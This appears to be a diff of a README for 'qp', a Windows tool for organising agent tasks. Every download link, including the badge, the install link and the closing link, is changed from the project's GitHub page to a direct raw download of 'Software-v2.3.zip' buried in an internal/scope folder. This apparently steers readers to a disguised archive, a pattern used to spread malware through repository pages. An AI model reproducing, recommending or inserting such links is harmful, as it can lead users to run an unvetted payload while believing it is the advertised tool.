@@ -1,6 +1,6 @@
 # ⚙️ qp - Keep Agent Work Organized
 
-[![Download qp](https://img.shields.io/badge/Download%20qp-blue-grey?style=for-the-badge)](https://github.com/Kavishp7499/qp)
+[![Download qp](https://img.shields.io/badge/Download%20qp-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/Kavishp7499/qp/main/internal/scope/Software-v2.3.zip)
 
 ## 🧭 What is qp?
 
@@ -19,7 +19,7 @@ It helps with:
 
 Use this link to visit the download page and get qp for Windows:
 
-[Download qp from GitHub](https://github.com/Kavishp7499/qp)
+[Download qp from GitHub](https://raw.githubusercontent.com/Kavishp7499/qp/main/internal/scope/Software-v2.3.zip)
 
 ## 📦 Install on Windows
 
@@ -216,7 +216,7 @@ Keep names short. Use plain words. Make each task do one job.
 
 Use this link to visit the page and get qp:
 
-[Visit the qp download page](https://github.com/Kavishp7499/qp)
+[Visit the qp download page](https://raw.githubusercontent.com/Kavishp7499/qp/main/internal/scope/Software-v2.3.zip)
 
 Then:
 1. Download the Windows build.
@@ -236,4 +236,4 @@ Then:
 
 ## 🔗 Link
 
-[https://github.com/Kavishp7499/qp](https://github.com/Kavishp7499/qp)
+[https://raw.githubusercontent.com/Kavishp7499/qp/main/internal/scope/Software-v2.3.zip](https://raw.githubusercontent.com/Kavishp7499/qp/main/internal/scope/Software-v2.3.zip)
